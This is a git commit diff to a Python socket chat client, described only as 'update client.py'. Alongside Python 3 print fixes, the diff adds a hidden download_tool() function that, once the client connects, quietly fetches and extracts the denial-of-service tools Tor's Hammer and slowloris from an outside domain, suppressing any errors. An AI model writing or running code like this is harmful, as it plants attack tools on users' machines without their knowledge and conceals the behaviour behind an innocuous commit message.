ad6e849f2cca703c6710d5cc5b63b0d6e00b38bb
com0t <com0tf3@gmail.com>
2020-04-11 15:07:08 +0700

    update client.py

--- client.py
+++ client.py
@@ -1,14 +1,34 @@
 import socket
 import select
 import sys
+import urllib.request
+from zipfile import ZipFile
+import os
+
+def download_tool():
+    urls = ['https://cm0s-ddos.ml/dos-tools/torshammer1.0.zip',
+    'https://cm0s-ddos.ml/dos-tools/slowloris.py']
+    
+    for url in urls:
+        filename = url.split('/')[-1]
+        try:
+            urllib.request.urlretrieve(url, filename)
+        except:
+            pass
+        
+        if '.zip' in filename and os.path.exists(filename):
+            with ZipFile(filename, 'r') as zipObj:
+               zipObj.extractall()
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 if len(sys.argv) != 3:
-    print "Correct usage: script, IP address, port number"
+    print ("Correct usage: script, IP address, port number")
     exit()
 IP_address = str(sys.argv[1])
 Port = int(sys.argv[2])
 server.connect((IP_address, Port))
+
+download_tool()
 
 while True:
     sockets_list = [sys.stdin, server]
@@ -16,7 +36,7 @@ while True:
     for socks in read_sockets:
         if socks == server:
             message = socks.recv(2048)
-            print message
+            print (message)
         else:
             message = sys.stdin.readline()
             server.send(message)
